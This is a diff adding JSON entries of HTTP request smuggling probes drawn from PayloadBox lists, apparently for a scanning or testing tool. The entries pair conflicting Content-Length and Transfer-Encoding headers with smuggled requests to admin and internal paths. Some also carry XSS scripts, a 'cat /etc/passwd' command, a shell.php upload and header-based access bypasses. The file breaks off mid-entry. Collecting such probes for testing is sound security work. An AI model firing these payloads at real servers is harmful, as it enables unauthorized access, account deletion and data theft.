+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "Transfer-Encoding\\r\\n: chunked\\r\\n\\r\\n5a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #22",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /private HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Authorization": "Bearer token123"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #23",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "8c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #24",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST /upload HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "multipart/form-data",
+      "Content-Length": "20"
+    },
+    "body": "filename=shell.php\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #25",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "96",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #26",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /admin HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "15"
+    },
+    "body": "x=1\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Detection-Payloads.txt, TE-CL-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #27",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "session=abcd1234",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "96",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #28",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /my-account HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "session=victim_session",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "10"
+    },
+    "body": "x=1\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #29",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "User-Agent": "Mozilla/5.0",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "71",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #30",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /admin HTTP/1.1",
+    "headers": {
+      "Host": "localhost",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "15"
+    },
+    "body": "x=1\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #31",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "68\\r\\n{\"method\":\"GET\",\"path\":\"/admin\",\"headers\":{\"Host\":\"localhost\"}}\\r\\n\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #32",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Connection": "keep-alive",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "3f",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #33",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /api/internal HTTP/1.1",
+    "headers": {
+      "Host": "localhost"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #34",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "46",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-CL-Payloads.txt, TE-TE-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #35",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /multi HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Multi": "true"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #36",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "a4",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #37",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST /admin/delete HTTP/1.1",
+    "headers": {
+      "Host": "localhost",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "17"
+    },
+    "body": "username=carlos\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #38",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "identity, chunked"
+    },
+    "body": "4c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #39",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /internal HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Internal": "1"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Bypass-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #40",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked, identity"
+    },
+    "body": "50",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #41",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /restricted HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Restricted": "true"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #42",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "135",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #43",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST /comment HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "50"
+    },
+    "body": "comment=<script>alert(1)</script>&postId=1",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #44",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "94",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Cache-Poisoning-Payloads.txt, Session-Hijacking-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #45",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST /comment HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "45"
+    },
+    "body": "comment=<script>alert(1)</script>&postId=1\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #46",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "156",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #47",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "User-Agent": "<script>alert(document.cookie)</script>",
+      "X-Forwarded-For": "127.0.0.1"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #48",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "a8",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #49",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "User-Agent": "<script>alert(document.cookie)</script>",
+      "X-Test": "payload"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #50",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "142",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #51",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: PUT /api/users/1 HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json",
+      "Content-Length": "30"
+    },
+    "body": "{\"role\":\"admin\",\"id\":1}",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #52",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "96",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #53",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: PUT /api/users/1 HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json",
+      "Content-Length": "28"
+    },
+    "body": "{\"role\":\"admin\",\"id\":1}\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #54",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "x-chunked"
+    },
+    "body": "3a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #55",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /smuggle HTTP/1.1",
+    "headers": {
+      "X-Smuggled": "payload"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #56",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "7a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Session-Hijacking-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #57",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST /api/execute HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "30"
+    },
+    "body": "{\"command\":\"cat /etc/passwd\"}\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #58",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "trailers"
+    },
+    "body": "44",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #59",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /admin HTTP/1.1",
+    "headers": {
+      "Host": "localhost",
+      "X-Admin": "true"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Bypass-Payloads.txt, TE-CL-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #60",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "84",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, Session-Hijacking-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #61",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: GET /socket.io/ HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Upgrade": "websocket",
+      "Connection": "Upgrade"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Advanced Payloads #62",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Advanced-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "3c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Advanced-Payloads.txt, TE-CL-Payloads.txt, TE-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #1",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "54",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #2",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET /admin HTTP/1.1",
+    "headers": {
+      "Host": "localhost"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #3",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "60",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #4",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET /admin HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt, Detection-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #5",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "71",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #6",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET /admin/delete?username=carlos HTTP/1.1",
+    "headers": {
+      "Foo": "x"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt, Detection-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #7",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "5b",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #8",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "112",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #9",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Original-URL": "/admin",
+      "X-Rewrite-URL": "/admin"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #10",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "71",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #11",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Custom-IP-Authorization": "127.0.0.1"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #12",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "108",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt, Cache-Poisoning-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #13",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Method-Override": "GET",
+      "X-Bypass": "true"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #14",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "4a",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #15",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "102",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #16",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET /restricted HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Forwarded-For": "127.0.0.1"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #17",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "5d",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #18",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET /api/internal HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Auth": "bypass"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #19",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "78",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #20",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET /api/internal HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Auth": "1"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #21",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "54",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #22",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET /private HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Internal": "true"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #23",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "95",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #24",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST /login HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "30"
+    },
+    "body": "username=admin&password=secret",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #25",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "4c",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #26",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "89",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #27",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "62",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #28",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "68",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, Session-Hijacking-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #29",
